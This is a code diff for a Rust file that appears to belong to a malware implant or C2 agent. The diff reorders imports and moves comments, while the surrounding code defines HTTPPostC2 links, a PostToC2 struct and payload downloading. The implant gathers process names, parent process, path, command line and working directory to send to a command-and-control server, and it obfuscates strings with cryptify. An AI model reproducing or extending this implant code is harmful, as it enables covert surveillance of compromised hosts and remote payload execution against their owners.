@@ -1,34 +1,31 @@
+use crate::config::Config;
 use crate::dataoperation::{apply_all_dataoperations, DataOperation, UnApplyDataOperation};
 use crate::poollink::Advanced;
-use anyhow::bail;
-use anyhow::Result;
-use cryptify::encrypt_string;
-use log::debug;
-use log::info;
-use rand::Rng;
-use serde::{Deserialize, Serialize};
-use std::io::Read;
-use std::{thread, time};
-
-use crate::config::Config;
-
-use std::fs;
-use std::time::Duration;
-
-use crate::payload::Payload;
-use ring::signature::{self, KeyPair};
-
 use crate::link_util::get_domain_name;
-//use std::path::Path;
 use crate::link_util::bytes_to_gigabytes_string;
 use crate::link_util::cmdline;
 use crate::link_util::process_name_and_parent;
 use crate::link_util::process_path;
 use crate::link_util::working_dir;
+use crate::payload::Payload;
 
-//use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
+use serde::{Deserialize, Serialize};
+use anyhow::bail;
+use anyhow::Result;
+use rand::Rng;
+use std::io::Read;
+use std::{thread, time};
+use std::fs;
+use std::time::Duration;
 use std::process;
+use ring::signature::{self, KeyPair};
 use sysinfo::System;
+//use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
+
+use cryptify::encrypt_string;
+use log::debug;
+use log::info;
+
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub enum Link {
@@ -194,10 +191,7 @@ pub trait LinkFetch {
         self.un_apply_all_dataoperations(data)
     }
 
-    //TODO apply all data_operation
 }
-
-//TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/
 
 impl LinkFetch for Link {
     fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
@@ -209,7 +203,8 @@ impl LinkFetch for Link {
             Link::HTTPPostC2(link) => link.download_data(config),
         }
     }
-
+    
+    //TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/
     fn download_data_post(
         &self,
         session_id: &String,
@@ -449,8 +444,6 @@ impl LinkFetch for HTTPLink {
 pub struct LightPayload {
     pub todo: String,
 }
-//use std::os::unix::process::parent_id;
-//use std::os:
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub struct PostToC2 {
@@ -505,11 +498,6 @@ impl LinkFetch for HTTPPostC2Link {
         let sys: System = System::new_all();
         let (process_name, parent_name, ppid) = process_name_and_parent(&sys);
         let process_path = process_path();
-
-        //let args: Vec<String> = ;
-
-        // Joindre les arguments en une seule chaîne, séparée par des espaces
-        //let args_string = args;
 
         let mut post_data: PostToC2 = PostToC2 {
             session_id: session_id.to_string(),
@@ -571,5 +559,3 @@ impl LinkFetch for HTTPPostC2Link {
         self.jitt
     }
 }
-
-// TODO reflechir. est-ce qu'on envoit la config actuelle ?? c'est lourd et il faudrait la chiffrer a fond
